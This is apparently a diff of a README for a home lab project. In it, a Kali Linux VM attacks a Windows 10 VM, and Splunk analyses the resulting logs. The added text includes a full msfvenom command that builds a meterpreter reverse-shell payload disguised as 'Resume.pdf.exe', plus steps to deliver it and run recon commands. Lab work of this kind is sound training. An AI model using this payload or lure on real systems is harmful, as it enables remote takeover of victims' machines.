@@ -5,10 +5,13 @@ The purpose of this home lab project was to build a safe, isolated environment t
 
 Using Kali Linux as the attacker machine and a Windows 10 virtual machine as the target, I created a custom piece of basic malware and executed it in a controlled internal network setup. The goal was to analyze its behavior and observe its impact using system tools and a SIEM (Splunk).
 
-## Skills Learned
-- Malware behavior analysis  
-- Snapshot-based rollback and system restoration    
-- Host-level forensics  
+## Skills Demonstrated
+- Safe malware execution and containment using snapshots
+- Basic malware creation with msfvenom
+- Manual reverse shell exploitation using meterpreter
+- Command-line reconnaissance techniques
+- Log analysis and event correlation in Splunk
+- Virtual networking and system hardening awareness
 
 ### Tools & Technologies Used
 * VirtualBox – for managing virtual machines and internal networking
@@ -17,6 +20,44 @@ Using Kali Linux as the attacker machine and a Windows 10 virtual machine as the
 - Splunk – SIEM for telemetry and event log collection
 - Command-line tools – net user, net localgroup, ipconfig.
 - Snapshot management – for safe rollback during malware testing
+
+
+
+#Malware Overview
+The malware was a basic reverse shell payload, named Resume.pdf.exe. It was generated using msfvenom on Kali Linux, designed to simulate a social engineering attack. 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > Resume.pdf.exe
+
+Behavior
+- When executed on the Windows VM, the malware initiates a reverse connection to the Kali Linux attacker's handler
+- It spawns cmd.exe as its parent process
+- Once the connection is established, the attacker can interact with the victim machine using a meterpreter shell.
+
+
+## Attack Summary
+1. Prepared internal-only virtual network for safe malware testing.
+
+2. Created malware on Kali Linux and hosted it on a simple HTTP server.
+
+3. Downloaded and executed the malware on the Windows VM.
+
+4. From the Kali Linux handler, established a shell on the Windows machine.
+
+5. Executed reconnaissance commands:
+
+net user
+
+net localgroup
+
+ipconfig
+
+6. Used Splunk to analyze logs and monitor process behavior and network activity.
+
+7.Observed process tree:
+Resume.pdf.exe → cmd.exe → system commands
+
+
+
+
 ## Screenshots
 
 1. Configured the Windows VM and the Linux VM to be on a secure internal network
@@ -47,10 +88,6 @@ Kali Linux VM
 
 
 4. Generating Telemetry (Splunk)
-   
-Summary- 1. executed malware on windows machine. 
-2. from the handler on the Kali Linux VM, I typed in "shell" to establish a shell on the windows machine and typed in net user, net local group and ipconfig
-
 
 Parent Image Resume.pdf.exe spawned cmd.exe which then ran net user, net localgroup and ipconfig.
 <img width="865" height="530" alt="Screenshot 6" src="https://github.com/user-attachments/assets/3474b1ca-baa3-4982-89e0-ccd8c57bb796" />
